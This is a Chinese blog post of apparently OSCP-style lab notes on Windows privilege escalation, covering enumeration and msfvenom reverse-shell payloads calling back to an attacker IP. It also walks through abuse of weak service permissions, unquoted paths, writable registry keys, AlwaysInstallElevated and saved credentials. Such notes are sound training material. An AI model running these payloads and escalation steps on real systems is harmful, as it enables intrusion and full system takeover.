@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="z4yn的博客">
+    <meta property="og:type" content="website">
+    <meta name="description" content="z4yn的博客">
+    <meta name="keyword"  content="OSCP,PTE">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        Windows privesc - Z4yn&#39;s blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Z4yn's blog" type="application/atom+xml">
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> Better to light one candle than to curse the darkness. </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>Z4yn&#39;s blog</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>收藏</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">#0 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Tools"><span class="toc-text">#1 Tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E"><span class="toc-text">#2 服务漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-text">#3 注册表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%AF%86%E7%A0%81"><span class="toc-text">#4 密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">#5 计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84-GUI-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-text">#6 不安全的 GUI 应用程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Startup-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-text">#7 Startup 应用程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E4%BB%A4%E7%89%8C%E6%A8%A1%E6%8B%9F"><span class="toc-text">#8 令牌模拟</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> Better to light one candle than to curse the darkness. </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        Windows privesc
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2022-11-07 15:27:37</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#提权" title="提权">提权</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <h3 id="0-信息收集"><a href="#0-信息收集" class="headerlink" title="#0 信息收集"></a>#0 信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用户信息收集</span></span><br><span class="line">当前用户的权限：whoami /priv</span><br><span class="line">列出用户：net users</span><br><span class="line">列出用户的详细信息：net user username（e.g. net user Administrator）</span><br><span class="line">其他用户同时登录：qwinsta（与query session命令相同）</span><br><span class="line">系统上定义的用户组：net localgroup</span><br><span class="line">列出特定组的成员：net localgroup groupname（e.g. net localgroup Administrators）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统信息收集</span></span><br><span class="line">systeminfo</span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span></span><br><span class="line">hostname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 补丁详细情况</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索文件</span></span><br><span class="line">findstr /si password *.txt</span><br><span class="line">命令分解：</span><br><span class="line">findstr：搜索文件中的文本模式。</span><br><span class="line">/si：搜索当前目录和所有子目录（s），忽略大写/小写差异（i）</span><br><span class="line">password：该命令将在文件中搜索字符串“密码”</span><br><span class="line">*.txt：搜索将涵盖具有 .txt 扩展名的文件</span><br><span class="line">可以根据您的需要和目标环境更改字符串和文件扩展名，但“.txt”、“.xml”、“.ini”、“*.config”和“.xls”通常是一个好地方开始。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网络连接</span></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计划任务</span></span><br><span class="line">schtasks：该命令可用于查询计划任务。</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 驱动程序</span></span><br><span class="line">driverquery</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看杀毒软件状态</span></span><br><span class="line">sc query windefend</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-Tools"><a href="#1-Tools" class="headerlink" title="#1 Tools"></a>#1 Tools</h3><p>WinPEAS：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
+<p>PowerUp：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反向shell</span></span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-服务漏洞"><a href="#2-服务漏洞" class="headerlink" title="#2 服务漏洞"></a>#2 服务漏洞</h3><p>) 1 - 不安全的服务权限</p>
+<p>accesschk.exe：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;Users&quot; *	#跟下面命令相同</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">uwcqv</span> <span class="title">user</span> *  #<span class="title">daclsvc</span>服务<span class="title">user</span>用户拥有更改服务配置权限(<span class="title">SERVICE_CHANGE_CONFIG</span>)</span></span><br><span class="line"><span class="function"><span class="title">sc</span> <span class="title">qc</span> <span class="title">daclsvc</span>	#查询服务并注意它以 <span class="title">SYSTEM</span> 权限 (<span class="title">SERVICE_START_NAME</span>) 运行</span></span><br><span class="line"><span class="function"><span class="title">sc</span> <span class="title">config</span> <span class="title">daclsvc</span> <span class="title">binpath</span>= &quot;\&quot;<span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span>\&quot;&quot;	#修改服务配置并将 <span class="title">BINARY_PATH_NAME</span> (<span class="title">binpath</span>) 设置为反向<span class="title">shell</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">start</span> <span class="title">daclsvc</span>	#在 <span class="title">Kali</span> 上启动一个侦听器，然后启动该服务以生成一个以 <span class="title">SYSTEM</span> 权限运行的反向 <span class="title">shell</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525152423849.png" alt="image-20220525152423849"></p>
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525142216546.png" alt="image-20220525142216546"></p>
+<p>) 2 - 未引用的服务路径</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>&gt;<span class="title">sc</span> <span class="title">qc</span> <span class="title">unquotedsvc</span>		#查询“ <span class="title">unquotedsvc</span>” 服务，注意它以 <span class="title">SYSTEM</span> 权限 (<span class="title">SERVICE_START_NAME</span>) 运行，并且 <span class="title">BINARY_PATH_NAME</span> 未引用并包含空格</span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">QueryServiceConfig</span> <span class="title">SUCCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">unquotedsvc</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">START_TYPE</span>         : 3   <span class="title">DEMAND_START</span></span></span><br><span class="line"><span class="function">        <span class="title">ERROR_CONTROL</span>      : 1   <span class="title">NORMAL</span></span></span><br><span class="line"><span class="function">        <span class="title">BINARY_PATH_NAME</span>   : <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>\<span class="title">Common</span> <span class="title">Files</span>\<span class="title">unquotedpathservice.exe</span></span></span><br><span class="line"><span class="function">        <span class="title">LOAD_ORDER_GROUP</span>   :</span></span><br><span class="line"><span class="function">        <span class="title">TAG</span>                : 0</span></span><br><span class="line"><span class="function">        <span class="title">DISPLAY_NAME</span>       : <span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span></span></span><br><span class="line"><span class="function">        <span class="title">DEPENDENCIES</span>       :</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START_NAME</span> : <span class="title">LocalSystem</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>&gt;<span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">uwdq</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>\&quot;		#使用 <span class="title">accesschk.exe</span>，注意 <span class="title">BUILTIN</span>\<span class="title">Users</span> 组允许写入 <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>\ 目录</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span></span></span><br><span class="line"><span class="function">  <span class="title">Medium</span> <span class="title">Mandatory</span> <span class="title">Level</span> (<span class="title">Default</span>) [<span class="title">No</span>-<span class="title">Write</span>-<span class="title">Up</span>]</span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Users</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">SERVICE</span>\<span class="title">TrustedInstaller</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>&gt;<span class="title">copy</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>\<span class="title">Common.exe</span>&quot;		#您创建的 <span class="title">reverse.exe</span> 可执行文件复制到此目录并将其重命名为 <span class="title">Common.exe</span></span></span><br><span class="line"><span class="function">        1 <span class="title">file</span>(<span class="title">s</span>) <span class="title">copied</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>&gt;<span class="title">net</span> <span class="title">start</span> <span class="title">unquotedsvc</span>		#在 <span class="title">Kali</span> 上启动一个侦听器，然后启动该服务以生成一个以 <span class="title">SYSTEM</span> 权限运行的反向 <span class="title">shell</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525152457510.png" alt="image-20220525152457510"></p>
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525154120916.png" alt="image-20220525154120916"></p>
+<p>) 3 - 不安全的注册表服务</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">c:\<span class="title">PrivEsc</span>&gt;<span class="title">sc</span> <span class="title">qc</span> <span class="title">regsvc</span>		# 查询“ <span class="title">regsvc</span>” 服务</span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">QueryServiceConfig</span> <span class="title">SUCCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">regsvc</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">START_TYPE</span>         : 3   <span class="title">DEMAND_START</span></span></span><br><span class="line"><span class="function">        <span class="title">ERROR_CONTROL</span>      : 1   <span class="title">NORMAL</span></span></span><br><span class="line"><span class="function">        <span class="title">BINARY_PATH_NAME</span>   : &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Insecure</span> <span class="title">Registry</span> <span class="title">Service</span>\<span class="title">insecureregistryservice.exe</span>&quot;</span></span><br><span class="line"><span class="function">        <span class="title">LOAD_ORDER_GROUP</span>   :</span></span><br><span class="line"><span class="function">        <span class="title">TAG</span>                : 0</span></span><br><span class="line"><span class="function">        <span class="title">DISPLAY_NAME</span>       : <span class="title">Insecure</span> <span class="title">Registry</span> <span class="title">Service</span></span></span><br><span class="line"><span class="function">        <span class="title">DEPENDENCIES</span>       :</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START_NAME</span> : <span class="title">LocalSystem</span>			# 注意它以 <span class="title">SYSTEM</span> 权限 (<span class="title">SERVICE_START_NAME</span>) 运行</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">PrivEsc</span>&gt;<span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">uvwqk</span> <span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Services</span>\<span class="title">regsvc</span></span></span><br><span class="line"><span class="function"><span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Services</span>\<span class="title">regsvc</span>	# 使用 <span class="title">accesschk.exe</span>(注意修改对应服务名称)</span></span><br><span class="line"><span class="function">  <span class="title">Medium</span> <span class="title">Mandatory</span> <span class="title">Level</span> (<span class="title">Default</span>) [<span class="title">No</span>-<span class="title">Write</span>-<span class="title">Up</span>]</span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">INTERACTIVE</span>	#请注意 <span class="title">regsvc</span> 服务的注册表项可由“<span class="title">NT</span>  <span class="title">AUTHORITY</span>\<span class="title">INTERACTIVE</span>”组（基本上所有登录用户）写入</span></span><br><span class="line"><span class="function">        <span class="title">KEY_ALL_ACCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">PrivEsc</span>&gt;<span class="title">reg</span> <span class="title">add</span> <span class="title">HKLM</span>\<span class="title">SYSTEM</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span>\<span class="title">regsvc</span> /<span class="title">v</span> <span class="title">ImagePath</span> /<span class="title">t</span> <span class="title">REG_EXPAND_SZ</span> /<span class="title">d</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> /<span class="title">f</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">PrivEsc</span>&gt;<span class="title">net</span> <span class="title">start</span> <span class="title">regsvc</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525161239852.png" alt="image-20220525161239852"></p>
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525160834061.png" alt="image-20220525160834061"></p>
+<p>) 4 - 不安全的服务可执行文件</p>
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525172553728.png" alt="image-20220525172553728"></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 查询“ filepermsvc” 服务</span><br><span class="line">sc qc filepermsvc	</span><br><span class="line"></span><br><span class="line"># 使用 accesschk.exe，请注意服务二进制文件 (BINARY_PATH_NAME) 文件对所有人都是可写的</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">quvw</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">File</span> <span class="title">Permissions</span> <span class="title">Service</span>\<span class="title">filepermservice.exe</span>&quot;	</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#复制您创建的 <span class="title">reverse.exe</span> 可执行文件并用它替换 <span class="title">filepermservice.exe</span></span></span><br><span class="line"><span class="function"><span class="title">copy</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">File</span> <span class="title">Permissions</span> <span class="title">Service</span>\<span class="title">filepermservice.exe</span>&quot; /<span class="title">Y</span>	</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#在 <span class="title">Kali</span> 上启动一个侦听器，然后启动该服务以生成一个以 <span class="title">SYSTEM</span> 权限运行的反向 <span class="title">shell</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">start</span> <span class="title">filepermsvc</span>	</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525170550784.png" alt="image-20220525170550784"></p>
+<h3 id="3-注册表"><a href="#3-注册表" class="headerlink" title="#3 注册表"></a>#3 注册表</h3><p>AutoRuns</p>
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525172120597.png" alt="image-20220525172120597"></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 在注册表中查询 AutoRun 可执行文件：</span><br><span class="line">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"></span><br><span class="line"># 使用 accesschk.exe，请注意其中一个 AutoRun 可执行文件对每个人都是可写的：</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">wvu</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Autorun</span> <span class="title">Program</span>\<span class="title">program.exe</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#复制您创建的 <span class="title">reverse.exe</span> 可执行文件 并用它覆盖 <span class="title">AutoRun</span> 可执行文件：</span></span><br><span class="line"><span class="function"><span class="title">copy</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Autorun</span> <span class="title">Program</span>\<span class="title">program.exe</span>&quot; /<span class="title">Y</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 在现实世界中，您必须等待管理员自己登录！</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525172846079.png" alt="image-20220525172846079"></p>
+<p>AlwaysInstallElevated</p>
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525175002143.png" alt="image-20220525175002143"></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 在注册表中查询 AlwaysInstallElevated 键：</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"># 请注意，两个键都设置为 <span class="number">1</span> (<span class="number">0</span>x1)。</span><br><span class="line"></span><br><span class="line">#在Kali上，使用msfvenom生成反向shell Windows Installer (reverse.msi)。更新LHOST IP地址：</span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="number">10</span>.<span class="number">11</span>.<span class="number">53</span>.<span class="number">68</span> LPORT=<span class="number">53</span> -f msi -o reverse.msi</span><br><span class="line"></span><br><span class="line"># 将 reverse.msi 文件传输到 Windows 上的 C:\PrivEsc 目录（使用之前的 SMB 服务器方法）。</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">10</span>.<span class="number">11</span>.<span class="number">53</span>.<span class="number">68</span>\share\reverse.msi c:\PrivEsc\reverse.msi</span><br><span class="line"></span><br><span class="line">#在 Kali 上启动一个监听器，然后运行安装程序以触发以 SYSTEM 权限运行的反向 shell：</span><br><span class="line">msiexec /quiet /qn /i C:\PrivEsc\reverse.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525220104009.png" alt="image-20220525220104009"></p>
+<h3 id="4-密码"><a href="#4-密码" class="headerlink" title="#4 密码"></a>#4 密码</h3><p>) 1 - 注册表</p>
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525224435116.png" alt="image-20220525224435116"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以在注册表中搜索包含password一词的键和值：</span></span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果您想节省一些时间，请查询此特定密钥以查找管理员 AutoLogon 凭据：</span></span><br><span class="line">reg query <span class="string">&quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>) 2 - 保存的凭据</p>
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220526095216760.png" alt="image-20220526095216760"></p>
+<p>如果winPEASany没用出结果需要手动输入命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有保存的凭据：</span></span><br><span class="line">cmdkey /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 Kali 上启动一个侦听器并使用 runas 和管理员用户保存的凭据运行 reverse.exe 可执行文件：</span></span><br><span class="line">runas /savecred /user:admin C:\PrivEsc\reverse.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\z4yn\AppData\Roaming\Typora\typora-user-images\image-20220525224203673.png" alt="image-20220525224203673"></p>
